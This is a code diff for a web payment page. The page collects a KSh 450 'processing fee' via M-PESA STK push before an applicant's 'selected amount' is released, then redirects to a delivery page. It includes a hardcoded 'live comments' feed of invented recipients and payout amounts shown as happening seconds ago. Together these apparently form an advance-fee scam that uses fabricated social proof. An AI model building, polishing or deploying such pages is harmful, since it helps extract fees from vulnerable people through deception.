@@ -46,6 +46,11 @@ background:rgba(22,163,74,.12);
 border:1px solid rgba(22,163,74,.25);
 }
 
+/* Only KSh and amount are green */
+.money{
+color:#22c55e;
+}
+
 label{
 display:block;
 margin:14px 0 6px;
@@ -190,11 +195,11 @@ animation:flowerFall linear forwards;
 <p>Please complete the processing fee payment to continue.</p>
 
 <div class="amount" id="selectedAmountBox">
-💵 Selected Amount: KSh 0
+💵 Selected Amount: <span class="money">KSh 0</span>
 </div>
 
 <div class="amount" id="feeAmount">
-🧾 Processing Fee: KSh 450
+🧾 Processing Fee: <span class="money">KSh 450</span>
 </div>
 
 <label>👤 Full Name</label>
@@ -236,17 +241,14 @@ animation:flowerFall linear forwards;
 </div>
 
 </div>
-
 </div>
 </div>
 
 <script>
 "use strict";
 
-/* YOUR LIVE RENDER BACKEND */
 const BACKEND_URL="https://nyota-program-001-functionality-1.onrender.com";
 
-/* Applicant details */
 const applicant=
 localStorage.getItem("fullName")||
 localStorage.getItem("fullname")||
@@ -261,7 +263,6 @@ localStorage.getItem("phone")||
 const processingFee=
 Number(localStorage.getItem("processingFee")||450);
 
-/* CORRECT: Read selected amount from page3.html only */
 const selectedAmount=
 Number(localStorage.getItem("selectedAmount")||0);
 
@@ -269,11 +270,12 @@ document.getElementById("name").textContent=applicant;
 document.getElementById("fullName").value=applicant;
 document.getElementById("phone").value=savedPhone;
 
-document.getElementById("selectedAmountBox").textContent=
-"💵 Selected Amount: KSh "+selectedAmount.toLocaleString("en-KE");
+/* Only KSh and amount are green */
+document.getElementById("selectedAmountBox").innerHTML=
+"💵 Selected Amount: <span class='money'>KSh "+selectedAmount.toLocaleString("en-KE")+"</span>";
 
-document.getElementById("feeAmount").textContent=
-"🧾 Processing Fee: KSh "+processingFee.toLocaleString("en-KE");
+document.getElementById("feeAmount").innerHTML=
+"🧾 Processing Fee: <span class='money'>KSh "+processingFee.toLocaleString("en-KE")+"</span>";
 
 const phoneEl=document.getElementById("phone");
 const payBtn=document.getElementById("payBtn");
@@ -292,9 +294,7 @@ payBtn.textContent=state?text:"💳 Pay Processing Fee";
 function normalizePhone(value){
 let phone=value.replace(/[^\d+]/g,"");
 if(phone.startsWith("+254")) phone=phone.slice(1);
-if(phone.startsWith("07")||phone.startsWith("01")){
-phone="254"+phone.slice(1);
-}
+if(phone.startsWith("07")||phone.startsWith("01")) phone="254"+phone.slice(1);
 return phone;
 }
 
@@ -303,10 +303,7 @@ const txt=await res.text();
 return txt?JSON.parse(txt):{};
 }
 
-/* STK PUSH */
-
 async function payNow(){
-
 const phone=normalizePhone(phoneEl.value.trim());
 
 if(!/^254(?:7|1)\d{8}$/.test(phone)){
@@ -320,16 +317,10 @@ setLoading(true,"Sending STK Push...");
 setMessage("Sending payment request...");
 
 try{
-
 const response=await fetch(`${BACKEND_URL}/stk-push`,{
 method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-phone,
-amount:processingFee
-})
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({phone,amount:processingFee})
 });
 
 const data=await readJson(response);
@@ -338,10 +329,7 @@ if(!response.ok||data.success===false){
 throw new Error(data.message||"STK Push failed.");
 }
 
-const transactionId=
-data.transactionId||
-data.data?.transactionId||
-data.checkout_request_id;
+const transactionId=data.transactionId||data.data?.transactionId||data.checkout_request_id;
 
 setLoading(true,"Waiting for payment...");
 setMessage("STK Push sent. Enter your M-PESA PIN.");
@@ -349,44 +337,29 @@ setMessage("STK Push sent. Enter your M-PESA PIN.");
 await checkPayment(transactionId);
 
 }catch(error){
-
 setMessage(error.message,"error");
 setLoading(false);
-
 }
-
 }
-
-/* PAYMENT STATUS */
 
 async function checkPayment(transactionId){
-
 const start=Date.now();
 
 while(Date.now()-start<120000){
-
 try{
-
 const response=await fetch(`${BACKEND_URL}/payment-status`,{
 method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
+headers:{"Content-Type":"application/json"},
 body:JSON.stringify({transactionId})
 });
 
 const result=await readJson(response);
-
 const status=String(result.data?.status||"").toUpperCase();
 
 if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
 setMessage("Payment successful. Redirecting...","success");
 setLoading(true,"Payment Confirmed");
-
-setTimeout(()=>{
-window.location.href="delivery.html";
-},1000);
-
+setTimeout(()=>window.location.href="delivery.html",1000);
 return;
 }
 
@@ -395,50 +368,37 @@ throw new Error("Payment "+status.toLowerCase()+".");
 }
 
 }catch(error){
-
 if(/failed|cancelled|expired/i.test(error.message)){
 setMessage(error.message,"error");
 setLoading(false);
 return;
 }
-
 }
 
 await new Promise(r=>setTimeout(r,3000));
-
 }
 
 setMessage("Payment confirmation timed out.","error");
 setLoading(false);
-
 }
 
 payBtn.addEventListener("click",payNow);
-
-/* FLOWER RAIN */
 
 const rainContainer=document.getElementById("flowerRain");
 const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
 
 function createRainFlower(){
-
 const flower=document.createElement("span");
-
 flower.className="rain-flower";
 flower.textContent=flowerIcons[Math.floor(Math.random()*flowerIcons.length)];
-
 flower.style.left=Math.random()*100+"%";
 flower.style.fontSize=(16+Math.random()*12)+"px";
 flower.style.animationDuration=(2+Math.random()*2)+"s";
-
 rainContainer.appendChild(flower);
-
 setTimeout(()=>flower.remove(),4000);
 }
 
 setInterval(createRainFlower,180);
-
-/* LIVE COMMENTS */
 
 const livePeople=[
 ["Achieng","07*****37","KSh 30,000","3s ago"],
@@ -461,7 +421,6 @@ const livePeople=[
 let current=4;
 
 function updateLiveComments(){
-
 const p1=livePeople[current];
 const p2=livePeople[(current+1)%livePeople.length];
 
@@ -480,7 +439,6 @@ current=(current+2)%livePeople.length;
 
 updateLiveComments();
 setInterval(updateLiveComments,3000);
-
 </script>
 
 </body>
